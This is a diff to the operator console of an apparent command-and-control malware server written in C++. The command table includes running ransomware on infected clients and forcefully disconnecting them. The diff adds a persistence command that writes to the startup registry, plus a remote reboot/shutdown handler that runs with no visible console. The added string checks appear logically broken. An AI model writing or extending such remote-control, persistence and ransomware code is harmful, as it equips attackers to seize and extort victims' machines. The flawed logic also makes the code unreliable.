@@ -36,6 +36,7 @@ const std::map<RemoteAction, std::string> ServerCommands =
     { kRemoteShutdown,    "Shutdown the clients machine." },
     { kKillClient,        "Forcefully disconnect the client from the C2 server." },
     { kRansomwareEnable,  "Run ransomware on the client." },
+    { kAddToStartup,      "Add a program to the startup registry."}
 };
 
 /*
@@ -563,10 +564,8 @@ unsigned int ServerInterface::GetFlagsFromInput(const std::string& s) {
     for ( auto& [flagName, flagInfo] : ServerCommandFlags ) {
         if ( s.find(flagName) == std::string::npos )
             continue;
-        std::cout << flagName << " ";
         flags |= flagInfo.flag;
     }
-    std::cout << std::endl;
     return flags;
 }
 
@@ -610,6 +609,23 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
 
         if ( cmdInfo.buffLen == -1 )
             break;
+
+        performed = true;
+        break;
+    }
+    case RemoteAction::kRemoteShutdown: {
+        std::string input;
+        std::cout << "REBOOT or SHUTDOWN: ";
+        std::getline(std::cin, input);
+
+        if ( input.find("REBOOT") )
+            cmdInfo.insert("restart");
+        else if ( input.find("SHUTDOWN") )
+            cmdInfo.insert("shutdown");
+        else
+            break;
+
+        cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
 
         performed = true;
         break;
